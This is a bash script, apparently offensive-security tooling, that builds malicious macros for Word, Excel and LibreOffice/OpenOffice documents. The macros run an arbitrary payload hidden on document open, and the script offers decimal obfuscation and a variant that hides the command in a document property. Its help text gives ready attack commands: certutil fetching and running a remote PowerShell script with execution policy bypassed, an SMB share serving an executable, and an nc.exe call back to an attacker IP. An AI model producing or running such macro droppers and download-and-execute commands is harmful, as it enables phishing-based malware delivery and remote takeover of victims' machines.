#!/bin/bash
man_help(){
cat <<eof
------------------------------------------------------------------------------
{!v!} Macro Template builder for different types of office like programs {!v!}
------------------------------------------------------------------------------
% command line options

-h || (Print the full help menu)
	[Note] (The short help menu will also print if no options are used)

-------------------------------------------------------------------------------
-o || (Select which office program template to use)
___________________________________________________________________
[1] (Microsoft Office {Word} - Simple Windows Wscript.Shell macro)
	(tested-works)
______________________________________________________________________________________
[2] (OpenOffice 0R LibreOffice - Simple Shell(command) macro for Odt document format)
	(tested-works)
	[But] - Only with short commands that are not base64 encoded

certutil -urlcache -split -f http://192.168.8.178/r.ps1 C:\Windows\Tasks\r.ps1 && powershell -ep bypass C:\Windows\Tasks\r.ps1
0r
impacket-smbserver -smb2support -username 'oreo' -password 'byte' share .
net use \\\\192.168.8.178\\share /user:192.168.8.178\oreo byte && cmd.exe /c \\\\192.168.8.178\share\amd.exe
_______________________________________________________________________________________________________
[3] (OpenOffice - Metasploit's template from openoffice_document_macro)
	(Failed)
_______________________________________________________________________________________________________
[4] (LibreOffice, OpenOffice, Or Word - VBA support macro with simple Decimal to ASCII Obf)
	(tested-works)
_______________________________________________________________________________________________________
[5] (Microsoft Office {Excel} - Simple Excel Macro using PID=Shell)
	(tested-works)
_______________________________________________________________________________________________________
[6] (Microsoft Office {Excel} - Excel macro ran by the CMD set in the Subject detail)
	(tested-works)

[Note] (Default macro option is set to [1])
[Note] (Option [6] Subject works only with cmd.exe making || cmd.exe /c powershell.exe)
[Note] (Libre and Open Office macro dev on Windows might not work if the Java runtime is not installed)

--------------------------------------------------------------------------------------------------------
-p || (The payload to use in the desired macro)
	[Note] (If the -p option is empty. A prompt will be used to enter the payload)
	       (The prompt is helpful if -p breaks the payload string)

-f || (Read the Payload from a file)

-------------------------------------------------------------------------------------------------------
% Print the help menu
	./builder.sh
	./builder.sh -h {0R} ./builder.sh -help

% Examples of using the builder.sh tool
	./builder.sh -o <macro-option> -p <"payload-string">

	./builder.sh -o 1 -p 'cmd.exe /c \\\\10.10.12.14\share\nc.exe 10.10.12.14 8443'
	./builder.sh -o 2
	./builder.sh -o 2 -f /path/to/payload_file.ps1

% how to craft your payload to better fit in the tool
1.  powershell
	echo -n "<ps1-payload>" | iconv -t UTF-16LE | base64 -w 0
	cat payload.ps1 | iconv -t UTF-16LE | base64 -w 0

------------------------------------------------------------------------------------------------------
% Tool alteratives if this script isn't useful enough...
	* msfconsole - exploit/multi/misc/openoffice_document_macro
	* msfconsole - exploit/multi/fileformat/libreoffice_macro_exec
	* msfconsole - exploit/multi/fileformat/office_word_macro
	* Online VBA to Python - http://vb2py.sourceforge.net/online_conversion.html
	* Onine VB IDE/Compiler - https://www.onlinegdb.com/online_vb_compiler
	* Online IDE that supports over 600 programming languages - https://tio.run/#
eof
exit 1
}
#-------------------------------------------------------------------------------------
short_help(){
cat <<eof
-------------------------------
{!} Default Macro Templates {!}
___________________________________________________________________
[1] (Microsoft Office {Word} - Simple Windows Wscript.Shell macro)
	(tested-works)
______________________________________________________________________________________
[2] (OpenOffice 0R LibreOffice - Simple Shell(command) macro for Odt document format)
	(tested-works)
	[But] - Only with short commands that are not base64 encoded

certutil -urlcache -split -f http://192.168.8.178/r.ps1 C:\Windows\Tasks\r.ps1 && powershell -ep bypass C:\Windows\Tasks\r.ps1
0r
impacket-smbserver -smb2support -username 'oreo' -password 'byte' share .
net use \\\\192.168.8.178\share /user:192.168.8.178\oreo byte && cmd.exe /c \\\\192.168.8.178\share\amd.exe
_______________________________________________________________________________________________________
[3] (OpenOffice - Metasploit's template from openoffice_document_macro)
	(Failed)
_______________________________________________________________________________________________________
[4] (LibreOffice, OpenOffice, Or Word - VBA support macro with simple Decimal to ASCII Obf)
	(tested-works)
_______________________________________________________________________________________________________
[5] (Microsoft Office {Excel} - Simple Excel Macro using PID=Shell)
	(tested-works)
_______________________________________________________________________________________________________
[6] (Microsoft Office {Excel} - Excel macro ran by the CMD set in the Subject detail)
	(tested-works)

-----------------------------------
{!} Macro Builder Basic Usage {!}
______________________________________
./builder.sh
./builder.sh -h

./builder.sh -o <option>
./builder.sh -o <option> -p "<payload>"
./builder.sh -o <option> -f /path/to/payload_file.txt
eof
exit 1
}
#-------------------------------------------------------------------------------------
one(){
cat <<eof

Sub AutoOpen()
        Logs
End Sub

Sub Doc_Open()
        Logs
End Sub

Sub Logs()
Dim Str As String
eof

echo -n $payload | fold -w 50 | sed -e 's/^/Str = Str + "/g' | sed -e 's/$/"/g'

cat <<eof


CreateObject("Wscript.Shell").Run Str
End Sub
eof
}
#-------------------------------------------------------------------------------------
two(){
cat <<eof

Sub OnLoad
Dim s As String
eof
echo -n $payload | fold -w 60 | sed -e 's/^/s = s + "/g' | sed -e 's/$/"/g'
cat <<eof

Shell(s,0)
End Sub
eof
}
#-------------------------------------------------------------------------------------
three(){
cat <<eof

Sub OnLoad
  Dim os as string
  os = GetOS
  If os = "windows" OR os = "osx" OR os = "linux" Then
    Exploit
  end If
End Sub

Sub Exploit
  Shell("$payload")
End Sub

Function GetOS() as string
  select case getGUIType
    case 1:
      GetOS = "windows"
    case 3:
      GetOS = "osx"
    case 4:
      GetOS = "linux"
  end select
End Function

Function GetExtName() as string
  select case GetOS
    case "windows"
      GetFileName = "exe"
    case else
      GetFileName = "bin"
  end select
End Function
eof
}
#--------------------------------------------------------------------------
four(){
dec_loader=$(cat <<eof|python3| tr '\n' ',' | sed s/,$//
string = "$payload"
chars = list(string)
length_chars = len(chars)
for i in range(length_chars):
    backstr = ' '.join(map(str, chars[i]))
    print(ord(backstr))
eof
)
cat <<eof

Option VBASupport 1
Sub AutoOpen()
	Format
End Sub

Sub Format()
        Dim i As Integer
        Dim a
	a = Array($dec_loader)
	Dim b As String
	For i = 0 To UBound(a)
	b = b & Chr(a(i))
	Next

	Call Shell(b, 0)
End Sub
eof
}
#--------------------------------------------------------------------------
five(){
cat <<eof

Sub Calc()
Dim Math As String
eof
echo -n $payload | fold -w 50 | sed -e 's/^/Math = Math + "/g' | sed -e 's/$/"/g'
echo -e "\nPID = Shell(Math,0)"
cat <<eof
End Sub

Sub Auto_Open()
    Calc
End Sub

Sub Document_Open()
    Calc
End Sub
eof
}
#--------------------------------------------------------------------------
six(){
cat <<eof

Sub Auto_Open()
    Support
End Sub

Sub Support()
Dim strProgramName As String
Dim strArgument As String
Set doc = ActiveWorkbook
strProgramName = doc.BuiltinDocumentProperties("Subject").Value

eof
echo -n $payload | fold -w 60 | sed -e 's/^/strArgument = strArgument + "/g' | sed -e 's/$/"/g'
cat <<eof


Call Shell("""" & strProgramName & """ """ & strArgument & """", vbHideFocus)
End Sub

Sub Workbook_Open()
    Auto_Open
End Sub
eof
}
#--------------------------------------------------------------------------
payload=""
macro_option="1"
if [ -z "$1" ]; then
	short_help
fi
if [ "$1" == "-h" ]; then
	man_help
fi
while [[ "$#" -gt 0 ]]
do
case "$1" in
	-f) file_payload=$2;;
	-o) macro_option=$2;;
	-p) payload="$2";;

esac
shift
done
if [[ $file_payload != '' ]];then
	payload=$(cat $file_payload)
elif [[ $payload == '' ]] && [[ $macro_option != '' ]]; then
	echo -e "\nEnter your Powershell or other payload:"
	read payload
else
	echo "Payload Not Properly Set"
fi
if [[ $macro_option == "1" ]]; then
	one
elif [[ $macro_option == "2" ]]; then
	two
elif [[ $macro_option == "3" ]]; then
	three
elif [[ $macro_option == "4" ]]; then
	four
elif [[ $macro_option == "5" ]]; then
	five
elif [[ $macro_option == "6" ]]; then
	six
else
	man_help
fi
